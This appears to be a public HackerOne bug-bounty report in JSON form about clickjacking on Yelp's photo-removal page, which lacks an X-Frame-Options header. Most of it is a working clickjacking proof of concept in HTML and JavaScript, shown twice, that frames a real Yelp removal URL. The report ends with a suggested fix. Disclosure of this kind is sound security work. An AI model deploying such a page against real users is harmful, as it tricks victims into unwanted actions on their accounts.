{"id":201848,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDE4NDg=","url":"https://hackerone.com/reports/201848","title":"Click jacking in delete image of user in Yelp","state":"Closed","substate":"duplicate","severity_rating":"medium","readable_substate":"Duplicate","created_at":"2017-01-28T23:00:52.575Z","submitted_at":"2017-01-28T23:00:52.575Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mohamedsherif","url":"/mohamedsherif","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/041/054/3183c7fd785c00f297f0d6f816bf009ced6a3a01_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":545,"url":"https://hackerone.com/yelp","handle":"yelp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Yelp","twitter_handle":"","website":"https://www.yelp.com","about":"Connecting people to great local businesses in communities around the world."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-11-09T20:27:02.906Z","bug_reporter_agreed_on_going_public_at":"2017-01-31T12:34:38.124Z","team_member_agreed_on_going_public_at":"2017-11-09T20:27:02.737Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n# Problem \nI found that https://www.yelp.com/user_photos/{photo_id}/remove is vulnerable to click-jacking because of missing X-Frame-Options on this page which allows an attacker to send the victim the POC ( sent with the report ) to the user to remove his profile picture \n# POC\n```\n\u003cdiv id=\"container\" style=\"clip-path:none;clip:auto;overflow:visible;position:absolute;left:0;top:0;width:100%;height:100%\"\u003e\n\u003cinput id=\"clickjack_focus\" style=\"opacity:0;position:absolute;left:-5000px;\"\u003e\n\u003cdiv id=\"clickjack_button\" style=\"opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 64px; height: 30px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;\"\u003e\u003cdiv style=\"position:relative;top: 50%;transform: translateY(-50%);\"\u003eClick\u003c/div\u003e\u003c/div\u003e\n\u003c!-- Show this element when clickjacking is complete --\u003e\n\u003cdiv id=\"clickjack_complete\" style=\"display:none;-webkit-transform-style: preserve-3d;-moz-transform-style: preserve-3d;transform-style: preserve-3d;font-family:Arial;font-size:16pt;color:red;text-align:center;width:100%;height:100%;\"\u003e\u003cdiv style=\"position:relative;top: 50%;transform: translateY(-50%);\"\u003eYou've been clickjacked!\u003c/div\u003e\u003c/div\u003e\n\u003ciframe id=\"parentFrame\" src=\"data:text/html;base64,PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIGZ1bmN0aW9uKGUpeyB2YXIgZGF0YSwgY2hpbGRGcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjaGlsZEZyYW1lIik7IHRyeSB7IGRhdGEgPSBKU09OLnBhcnNlKGUuZGF0YSk7IH0gY2F0Y2goZSl7IGRhdGEgPSB7fTsgfSBpZighZGF0YS5jbGlja2JhbmRpdCl7IHJldHVybiBmYWxzZTsgfSBjaGlsZEZyYW1lLnN0eWxlLndpZHRoID0gZGF0YS5kb2NXaWR0aCsicHgiO2NoaWxkRnJhbWUuc3R5bGUuaGVpZ2h0ID0gZGF0YS5kb2NIZWlnaHQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLmxlZnQgPSBkYXRhLmxlZnQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLnRvcCA9IGRhdGEudG9wKyJweCI7fSwgZmFsc2UpOzwvc2NyaXB0PjxpZnJhbWUgc3JjPSJodHRwczovL3d3dy55ZWxwLmNvbS91c2VyX3Bob3Rvcy9idlBiOUVzWXhRb1RfWENGMzYzSEpRL3JlbW92ZSIgc2Nyb2xsaW5nPSJubyIgc3R5bGU9IndpZHRoOjEzNDlweDtoZWlnaHQ6NzY1cHg7cG9zaXRpb246YWJzb2x1dGU7bGVmdDo1cHg7dG9wOi0xMDdweDtib3JkZXI6MDsiIGZyYW1lYm9yZGVyPSIwIiBpZD0iY2hpbGRGcmFtZSIgb25sb2FkPSJwYXJlbnQucG9zdE1lc3NhZ2UoSlNPTi5zdHJpbmdpZnkoe2NsaWNrYmFuZGl0OjF9KSwnKicpIj48L2lmcmFtZT4=\" scrolling=\"no\" style=\"transform: scale(1); transform-origin: 200px 200px 0px; opacity: 0.5; border: 0px none; position: absolute; z-index: 1; width: 1349px; height: 896px; left: 0px; top: 0px;\" frameborder=\"0\"\u003e\u003c/iframe\u003e\n\u003c/div\u003e\n\u003cscript\u003efunction findPos(obj) {\n\t    var left = 0, top = 0;\n\t    if(obj.offsetParent) {\n\t        while(1) {\n\t          left += obj.offsetLeft;\n\t          top += obj.offsetTop;\n\t          if(!obj.offsetParent) {\n\t            break;\n\t          }\n\t          obj = obj.offsetParent;\n\t        }\n\t    } else if(obj.x \u0026\u0026 obj.y) {\n\t        left += obj.x;\n\t        top += obj.y;\n\t    }\n\t    return [left,top];\n  \t}function generateClickArea(pos) {\n\t\t\tvar elementWidth, elementHeight, x, y, parentFrame = document.getElementById('parentFrame'), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight, \n\t\t\t\tbtn = document.getElementById('clickjack_button');\n\t\t\tif(pos \u003c window.clickbandit.config.clickTracking.length) {\n\t\t\t\tclickjackCompleted(false);\n\t\t\t\telementWidth = window.clickbandit.config.clickTracking[pos].width;\n\t\t\t\telementHeight = window.clickbandit.config.clickTracking[pos].height;\n\t\t\t\tbtn.style.width = elementWidth + 'px';\n\t\t\t\tbtn.style.height = elementHeight + 'px';\n\t\t\t\twindow.clickbandit.elementWidth = elementWidth;\n\t\t\t\twindow.clickbandit.elementHeight = elementHeight;\n\t\t\t\tx = window.clickbandit.config.clickTracking[pos].left;\n\t\t\t\ty = window.clickbandit.config.clickTracking[pos].top;\n\t\t\t\tdocWidth = window.clickbandit.config.clickTracking[pos].documentWidth;\n\t\t\t\tdocHeight = window.clickbandit.config.clickTracking[pos].documentHeight;\n\t\t\t\tparentOffsetWidth = desiredX - x;\n\t\t\t\tparentOffsetHeight = desiredY - y;\n\t\t\t\tparentFrame.style.width = docWidth+'px';\n\t\t\t\tparentFrame.style.height = docHeight+'px';\n\t\t\t\tparentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),'*');\n\t\t\t\tcalculateButtonSize(getFactor(parentFrame));\n\t\t\t\tshowButton();\n\t\t\t\tif(parentFrame.style.opacity === '0') {\n\t\t\t\t\tcalculateClip();\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tresetClip();\n\t\t\t\thideButton();\n\t\t\t\tclickjackCompleted(true);\n\t\t\t}\n\t\t}function hideButton() {\n\t\t\tvar btn = document.getElementById('clickjack_button');\n\t\t\tbtn.style.opacity = 0;\n\t\t}function showButton() {\n\t\t\tvar btn = document.getElementById('clickjack_button');\n\t\t\tbtn.style.opacity = 1;\n\t\t}function clickjackCompleted(show) {\n\t\t\tvar complete = document.getElementById('clickjack_complete');\n\t\t\tif(show) {\n\t\t\t\tcomplete.style.display = 'block';\n\t\t\t} else {\n\t\t\t\tcomplete.style.display = 'none';\n\t\t\t}\n\t\t}window.addEventListener(\"message\", function handleMessages(e){\n\t\t\tvar data;\n\t\t\ttry { \n\t\t\t\tdata = JSON.parse(e.data);\n\t\t\t} catch(e){ \n\t\t\t\tdata = {}; \n\t\t\t}\n\t\t\tif(!data.clickbandit) { \n\t\t\t\treturn false; \n\t\t\t} \n\t\t\tshowButton(); \n\t\t},false);window.addEventListener(\"blur\", function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById(\"clickjack_focus\").focus();},1000); } }, false);document.getElementById(\"parentFrame\").addEventListener(\"mouseover\",function(){ window.clickbandit.mouseover = true; }, false);document.getElementById(\"parentFrame\").addEventListener(\"mouseout\",function(){ window.clickbandit.mouseover = false; }, false);\u003c/script\u003e\u003cscript\u003ewindow.clickbandit={mode: \"review\", mouseover:false,elementWidth:64,elementHeight:30,config:{\"clickTracking\":[{\"width\":64,\"height\":30,\"mouseX\":239,\"mouseY\":333,\"left\":195,\"top\":307,\"documentWidth\":1349,\"documentHeight\":896}],\"currentPosition\":0}};function calculateClip() {\n\t\t\tvar btn = document.getElementById('clickjack_button'), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById('container'), x = btn.offsetLeft, y = btn.offsetTop;\n\t\t\tcontainer.style.overflow = 'hidden';\n\t\t\tcontainer.style.clip = 'rect('+y+'px, '+(x+w)+'px, '+(y+h)+'px, '+x+'px)';\n\t\t\tcontainer.style.clipPath = 'inset('+y+'px '+(x+w)+'px '+(y+h)+'px '+x+'px)';\n\t\t}function calculateButtonSize(factor) {\n\t\t\tvar btn = document.getElementById('clickjack_button'), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);\n\t\t\tbtn.style.width = resizedWidth + 'px';\n\t\t\tbtn.style.height = resizedHeight + 'px';\n\t\t\tif(factor \u003e 100) {\n\t\t\t\tbtn.style.fontSize = '400%';\n\t\t\t} else {\n\t\t\t\tbtn.style.fontSize = (factor * 100) + '%';\n\t\t\t}\n\t\t}function resetClip() {\n\t\t\tvar container = document.getElementById('container');\n\t\t\tcontainer.style.overflow = 'visible';\n\t\t\tcontainer.style.clip = 'auto';\n\t\t\tcontainer.style.clipPath = 'none';\n\t\t}function getFactor(obj) {\n\t\t\tif(typeof obj.style.transform === 'string') {\n\t\t\t\treturn obj.style.transform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.msTransform === 'string') {\n\t\t\t\treturn obj.style.msTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.MozTransform === 'string') {\n\t\t\t\treturn obj.style.MozTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.oTransform === 'string') {\n\t\t\t\treturn obj.style.oTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\tif(typeof obj.style.webkitTransform === 'string') {\n\t\t\t\treturn obj.style.webkitTransform.replace(/[^\\d.]/g,'');\n\t\t\t}\n\t\t\treturn 1;\n\t\t}\u003c/script\u003e\n```\n# Solution \nAdding X-FRAME-OPTIONS header with value DENY or ( and ) asking for user password when deleting photos\n\nThanks, \nMohamed","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003ch1 id=\"problem\"\u003eProblem\u003c/h1\u003e\n\n\u003cp\u003eI found that \u003ca title=\"https://www.yelp.com/user_photos/%7Bphoto_id%7D/remove\" href=\"/redirect?url=https%3A%2F%2Fwww.yelp.com%2Fuser_photos%2F%257Bphoto_id%257D%2Fremove\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.yelp.com/user_photos/%7Bphoto_id%7D/remove\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is vulnerable to click-jacking because of missing X-Frame-Options on this page which allows an attacker to send the victim the POC ( sent with the report ) to the user to remove his profile picture \u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;div id=\u0026quot;container\u0026quot; style=\u0026quot;clip-path:none;clip:auto;overflow:visible;position:absolute;left:0;top:0;width:100%;height:100%\u0026quot;\u0026gt;\n\u0026lt;input id=\u0026quot;clickjack_focus\u0026quot; style=\u0026quot;opacity:0;position:absolute;left:-5000px;\u0026quot;\u0026gt;\n\u0026lt;div id=\u0026quot;clickjack_button\u0026quot; style=\u0026quot;opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 64px; height: 30px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;\u0026quot;\u0026gt;\u0026lt;div style=\u0026quot;position:relative;top: 50%;transform: translateY(-50%);\u0026quot;\u0026gt;Click\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\n\u0026lt;!-- Show this element when clickjacking is complete --\u0026gt;\n\u0026lt;div id=\u0026quot;clickjack_complete\u0026quot; style=\u0026quot;display:none;-webkit-transform-style: preserve-3d;-moz-transform-style: preserve-3d;transform-style: preserve-3d;font-family:Arial;font-size:16pt;color:red;text-align:center;width:100%;height:100%;\u0026quot;\u0026gt;\u0026lt;div style=\u0026quot;position:relative;top: 50%;transform: translateY(-50%);\u0026quot;\u0026gt;You\u0026#39;ve been clickjacked!\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\n\u0026lt;iframe id=\u0026quot;parentFrame\u0026quot; src=\u0026quot;data:text/html;base64,PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIGZ1bmN0aW9uKGUpeyB2YXIgZGF0YSwgY2hpbGRGcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjaGlsZEZyYW1lIik7IHRyeSB7IGRhdGEgPSBKU09OLnBhcnNlKGUuZGF0YSk7IH0gY2F0Y2goZSl7IGRhdGEgPSB7fTsgfSBpZighZGF0YS5jbGlja2JhbmRpdCl7IHJldHVybiBmYWxzZTsgfSBjaGlsZEZyYW1lLnN0eWxlLndpZHRoID0gZGF0YS5kb2NXaWR0aCsicHgiO2NoaWxkRnJhbWUuc3R5bGUuaGVpZ2h0ID0gZGF0YS5kb2NIZWlnaHQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLmxlZnQgPSBkYXRhLmxlZnQrInB4IjtjaGlsZEZyYW1lLnN0eWxlLnRvcCA9IGRhdGEudG9wKyJweCI7fSwgZmFsc2UpOzwvc2NyaXB0PjxpZnJhbWUgc3JjPSJodHRwczovL3d3dy55ZWxwLmNvbS91c2VyX3Bob3Rvcy9idlBiOUVzWXhRb1RfWENGMzYzSEpRL3JlbW92ZSIgc2Nyb2xsaW5nPSJubyIgc3R5bGU9IndpZHRoOjEzNDlweDtoZWlnaHQ6NzY1cHg7cG9zaXRpb246YWJzb2x1dGU7bGVmdDo1cHg7dG9wOi0xMDdweDtib3JkZXI6MDsiIGZyYW1lYm9yZGVyPSIwIiBpZD0iY2hpbGRGcmFtZSIgb25sb2FkPSJwYXJlbnQucG9zdE1lc3NhZ2UoSlNPTi5zdHJpbmdpZnkoe2NsaWNrYmFuZGl0OjF9KSwnKicpIj48L2lmcmFtZT4=\u0026quot; scrolling=\u0026quot;no\u0026quot; style=\u0026quot;transform: scale(1); transform-origin: 200px 200px 0px; opacity: 0.5; border: 0px none; position: absolute; z-index: 1; width: 1349px; height: 896px; left: 0px; top: 0px;\u0026quot; frameborder=\u0026quot;0\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\n\u0026lt;/div\u0026gt;\n\u0026lt;script\u0026gt;function findPos(obj) {\n        var left = 0, top = 0;\n        if(obj.offsetParent) {\n            while(1) {\n              left += obj.offsetLeft;\n              top += obj.offsetTop;\n              if(!obj.offsetParent) {\n                break;\n              }\n              obj = obj.offsetParent;\n            }\n        } else if(obj.x \u0026amp;\u0026amp; obj.y) {\n            left += obj.x;\n            top += obj.y;\n        }\n        return [left,top];\n    }function generateClickArea(pos) {\n            var elementWidth, elementHeight, x, y, parentFrame = document.getElementById(\u0026#39;parentFrame\u0026#39;), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight, \n                btn = document.getElementById(\u0026#39;clickjack_button\u0026#39;);\n            if(pos \u0026lt; window.clickbandit.config.clickTracking.length) {\n                clickjackCompleted(false);\n                elementWidth = window.clickbandit.config.clickTracking[pos].width;\n                elementHeight = window.clickbandit.config.clickTracking[pos].height;\n                btn.style.width = elementWidth + \u0026#39;px\u0026#39;;\n                btn.style.height = elementHeight + \u0026#39;px\u0026#39;;\n                window.clickbandit.elementWidth = elementWidth;\n                window.clickbandit.elementHeight = elementHeight;\n                x = window.clickbandit.config.clickTracking[pos].left;\n                y = window.clickbandit.config.clickTracking[pos].top;\n                docWidth = window.clickbandit.config.clickTracking[pos].documentWidth;\n                docHeight = window.clickbandit.config.clickTracking[pos].documentHeight;\n                parentOffsetWidth = desiredX - x;\n                parentOffsetHeight = desiredY - y;\n                parentFrame.style.width = docWidth+\u0026#39;px\u0026#39;;\n                parentFrame.style.height = docHeight+\u0026#39;px\u0026#39;;\n                parentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),\u0026#39;*\u0026#39;);\n                calculateButtonSize(getFactor(parentFrame));\n                showButton();\n                if(parentFrame.style.opacity === \u0026#39;0\u0026#39;) {\n                    calculateClip();\n                }\n            } else {\n                resetClip();\n                hideButton();\n                clickjackCompleted(true);\n            }\n        }function hideButton() {\n            var btn = document.getElementById(\u0026#39;clickjack_button\u0026#39;);\n            btn.style.opacity = 0;\n        }function showButton() {\n            var btn = document.getElementById(\u0026#39;clickjack_button\u0026#39;);\n            btn.style.opacity = 1;\n        }function clickjackCompleted(show) {\n            var complete = document.getElementById(\u0026#39;clickjack_complete\u0026#39;);\n            if(show) {\n                complete.style.display = \u0026#39;block\u0026#39;;\n            } else {\n                complete.style.display = \u0026#39;none\u0026#39;;\n            }\n        }window.addEventListener(\u0026quot;message\u0026quot;, function handleMessages(e){\n            var data;\n            try { \n                data = JSON.parse(e.data);\n            } catch(e){ \n                data = {}; \n            }\n            if(!data.clickbandit) { \n                return false; \n            } \n            showButton(); \n        },false);window.addEventListener(\u0026quot;blur\u0026quot;, function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById(\u0026quot;clickjack_focus\u0026quot;).focus();},1000); } }, false);document.getElementById(\u0026quot;parentFrame\u0026quot;).addEventListener(\u0026quot;mouseover\u0026quot;,function(){ window.clickbandit.mouseover = true; }, false);document.getElementById(\u0026quot;parentFrame\u0026quot;).addEventListener(\u0026quot;mouseout\u0026quot;,function(){ window.clickbandit.mouseover = false; }, false);\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;window.clickbandit={mode: \u0026quot;review\u0026quot;, mouseover:false,elementWidth:64,elementHeight:30,config:{\u0026quot;clickTracking\u0026quot;:[{\u0026quot;width\u0026quot;:64,\u0026quot;height\u0026quot;:30,\u0026quot;mouseX\u0026quot;:239,\u0026quot;mouseY\u0026quot;:333,\u0026quot;left\u0026quot;:195,\u0026quot;top\u0026quot;:307,\u0026quot;documentWidth\u0026quot;:1349,\u0026quot;documentHeight\u0026quot;:896}],\u0026quot;currentPosition\u0026quot;:0}};function calculateClip() {\n            var btn = document.getElementById(\u0026#39;clickjack_button\u0026#39;), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById(\u0026#39;container\u0026#39;), x = btn.offsetLeft, y = btn.offsetTop;\n            container.style.overflow = \u0026#39;hidden\u0026#39;;\n            container.style.clip = \u0026#39;rect(\u0026#39;+y+\u0026#39;px, \u0026#39;+(x+w)+\u0026#39;px, \u0026#39;+(y+h)+\u0026#39;px, \u0026#39;+x+\u0026#39;px)\u0026#39;;\n            container.style.clipPath = \u0026#39;inset(\u0026#39;+y+\u0026#39;px \u0026#39;+(x+w)+\u0026#39;px \u0026#39;+(y+h)+\u0026#39;px \u0026#39;+x+\u0026#39;px)\u0026#39;;\n        }function calculateButtonSize(factor) {\n            var btn = document.getElementById(\u0026#39;clickjack_button\u0026#39;), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);\n            btn.style.width = resizedWidth + \u0026#39;px\u0026#39;;\n            btn.style.height = resizedHeight + \u0026#39;px\u0026#39;;\n            if(factor \u0026gt; 100) {\n                btn.style.fontSize = \u0026#39;400%\u0026#39;;\n            } else {\n                btn.style.fontSize = (factor * 100) + \u0026#39;%\u0026#39;;\n            }\n        }function resetClip() {\n            var container = document.getElementById(\u0026#39;container\u0026#39;);\n            container.style.overflow = \u0026#39;visible\u0026#39;;\n            container.style.clip = \u0026#39;auto\u0026#39;;\n            container.style.clipPath = \u0026#39;none\u0026#39;;\n        }function getFactor(obj) {\n            if(typeof obj.style.transform === \u0026#39;string\u0026#39;) {\n                return obj.style.transform.replace(/[^\\d.]/g,\u0026#39;\u0026#39;);\n            }\n            if(typeof obj.style.msTransform === \u0026#39;string\u0026#39;) {\n                return obj.style.msTransform.replace(/[^\\d.]/g,\u0026#39;\u0026#39;);\n            }\n            if(typeof obj.style.MozTransform === \u0026#39;string\u0026#39;) {\n                return obj.style.MozTransform.replace(/[^\\d.]/g,\u0026#39;\u0026#39;);\n            }\n            if(typeof obj.style.oTransform === \u0026#39;string\u0026#39;) {\n                return obj.style.oTransform.replace(/[^\\d.]/g,\u0026#39;\u0026#39;);\n            }\n            if(typeof obj.style.webkitTransform === \u0026#39;string\u0026#39;) {\n                return obj.style.webkitTransform.replace(/[^\\d.]/g,\u0026#39;\u0026#39;);\n            }\n            return 1;\n        }\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"solution\"\u003eSolution\u003c/h1\u003e\n\n\u003cp\u003eAdding X-FRAME-OPTIONS header with value DENY or ( and ) asking for user password when deleting photos\u003c/p\u003e\n\n\u003cp\u003eThanks, \u003cbr\u003e\nMohamed\u003c/p\u003e\n","weakness":{"id":74,"name":"UI Redressing (Clickjacking)"},"original_report_id":49888,"original_report_url":"https://hackerone.com/reports/49888","attachments":[{"id":155776,"file_name":"clickjacked.html","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/776/e451aa6589d0f626609d6fd67503d7a743830319/clickjacked.html?response-content-disposition=attachment%3B%20filename%3D%22clickjacked.html%22%3B%20filename%2A%3DUTF-8%27%27clickjacked.html\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045337Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=e91bff041cd4efc1859d26c89bfd3ad9355c8adceb724982ad9b6a431e35707f","file_size":7269,"type":"text/html"},{"id":155778,"file_name":"screenshot.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/155/778/f47457a70cbecec9328e6a58f7db2b7d3cd3603e/screenshot.png?response-content-disposition=attachment%3B%20filename%3D%22screenshot.png%22%3B%20filename%2A%3DUTF-8%27%27screenshot.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045337Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=e620748782f44799f1614be6cb86efbeb86136a66fa1a0b72a85aaa8f2f5ce29","file_size":98091,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["mohamedsherif","b4155f7c29acd42c27d007a"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1449922,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there!\n\nThanks for submitting your report to us! Please expect a response within a week.\n\nBest,\nThe Yelp Security Team\n","markdown_message":"\u003cp\u003eHi there!\u003c/p\u003e\n\n\u003cp\u003eThanks for submitting your report to us! Please expect a response within a week.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nThe Yelp Security 